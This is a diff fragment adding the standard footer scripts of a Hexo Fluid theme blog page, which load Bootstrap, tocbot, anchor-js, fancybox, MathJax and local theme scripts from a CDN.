+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  
+      <script>
+        if (!window.MathJax) {
+          window.MathJax = {
+            tex    : {
+              inlineMath: { '[+]': [['$', '$']] }
+            },
+            loader : {
+              load: ['ui/lazy']
+            },
+            options: {
+              renderActions: {
+                insertedScript: [200, () => {
+                  document.querySelectorAll('mjx-container').forEach(node => {
+                    let target = node.parentNode;
+                    if (target.nodeName.toLowerCase() === 'li') {
+                      target.parentNode.classList.add('has-jax');
+                    }
+                  });
+                }, '', false]
+              }
+            }
+          };
+        } else {
+          MathJax.startup.document.state(0);
+          MathJax.texReset();
+          MathJax.typeset();
+          MathJax.typesetPromise();
+        }
+
+        Fluid.events.registerRefreshCallback(function() {
+          if ('MathJax' in window && MathJax.startup.document && typeof MathJax.startup.document.state === 'function') {
+            MathJax.startup.document.state(0);
+            MathJax.texReset();
+            MathJax.typeset();
+            MathJax.typesetPromise();
+          }
+        });
+      </script>
+    
+
+  <script  src="https://lib.baomitu.com/mathjax/3.2.2/es5/tex-mml-chtml.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
